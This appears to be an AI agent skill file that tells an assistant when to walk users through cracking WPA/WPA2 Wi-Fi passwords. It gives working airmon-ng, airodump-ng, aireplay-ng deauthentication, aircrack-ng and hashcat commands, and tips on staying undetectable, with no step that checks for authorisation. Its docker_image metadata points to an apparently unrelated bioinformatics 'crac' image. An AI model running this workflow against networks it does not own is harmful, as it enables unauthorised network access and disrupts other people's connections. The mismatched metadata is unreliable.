---
name: crac
description: The crac tool provides a streamlined workflow for auditing WPA/WPA2 wireless network security by capturing handshakes and recovering passwords. Use when user asks to enable monitor mode, scan for wireless networks, capture a 4-way handshake, or crack WPA/WPA2 passwords using Aircrack-ng or Hashcat.
homepage: https://github.com/brannondorsey/wifi-cracking
metadata:
  docker_image: "biocontainers/crac:v2.5.0dfsg-3-deb_cv1"
---

# crac

## Overview

The crac skill provides a streamlined workflow for auditing the security of WPA/WPA2 wireless networks. It guides the user through the transition of wireless hardware into monitor mode, the identification of target Access Points (APs), the capture of the essential 4-way authentication handshake, and the final password recovery phase. This process supports both passive monitoring (to remain undetectable) and active deauthentication attacks to force handshakes, utilizing tools like Aircrack-ng for CPU-based cracking or Hashcat for high-performance GPU-based cracking.

## Wireless Interface Setup

Before capturing traffic, the wireless card must be placed in monitor mode to "sniff" packets without being associated with an AP.

1.  **Identify Interface**: List available wireless interfaces.
    ```bash
    airmon-ng
    ```
2.  **Enable Monitor Mode**: Start monitor mode on your interface (e.g., `wlan0`).
    ```bash
    airmon-ng start wlan0
    ```
3.  **Verify**: Check for the new monitor interface name (usually `wlan0mon` or `mon0`).
    ```bash
    iwconfig
    ```

## Target Reconnaissance

1.  **Scan Nearby Networks**: Listen for beacon frames to find your target BSSID and Channel.
    ```bash
    airodump-ng wlan0mon
    ```
2.  **Identify Target**: Note the **BSSID** (MAC address) and **CH** (Channel) of the network you intend to test.

## Handshake Capture

To crack a WPA/WPA2 password, you must capture a 4-way handshake that occurs when a client connects to the network.

1.  **Targeted Capture**: Monitor only the specific target channel and BSSID.
    ```bash
    # -c: channel, --bssid: target MAC, -w: output file prefix
    airodump-ng -c [channel] --bssid [BSSID] -w capture_output wlan0mon
    ```
2.  **Wait for Handshake**: Look for the text `[ WPA handshake: XX:XX:XX:XX:XX:XX ]` in the top right corner of the `airodump-ng` screen.
3.  **Active Deauthentication (Optional)**: If a client is already connected but you don't want to wait for a natural reconnection, send deauth packets to force a reconnect.
    ```bash
    # -0: deauth count (0 for unlimited), -a: AP BSSID
    aireplay-ng -0 5 -a [BSSID] wlan0mon
    ```

## Password Cracking

Once a `.cap` file containing a handshake is obtained, use a dictionary attack to recover the password.

### CPU Cracking (Aircrack-ng)
Best for quick tests or when a GPU is unavailable.
```bash
aircrack-ng -w [path_to_wordlist] capture_output-01.cap
```

### GPU Cracking (Hashcat)
Significantly faster for large wordlists. Requires converting the `.cap` file to `.hccapx` format.

1.  **Convert File**: Use `cap2hccapx` or an online converter.
    ```bash
    cap2hccapx capture_output-01.cap target_network.hccapx
    ```
2.  **Run Hashcat**:
    ```bash
    # -m 2500: WPA/WPA2 hash mode
    hashcat -m 2500 target_network.hccapx [path_to_wordlist]
    ```

## Best Practices and Tips

*   **Passive vs. Active**: Passive monitoring is undetectable. Active deauthentication is visible to network monitors but speeds up the process significantly.
*   **Wordlist Quality**: The success of the attack depends entirely on the wordlist. Use `rockyou.txt` for general purposes or `Probable-Wordlists` for default router passwords.
*   **Interface Cleanup**: When finished, take the interface out of monitor mode to restore standard networking.
    ```bash
    airmon-ng stop wlan0mon
    ```

## Reference documentation
- [Wi-Fi Cracking Guide](./references/github_com_brannondorsey_wifi-cracking.md)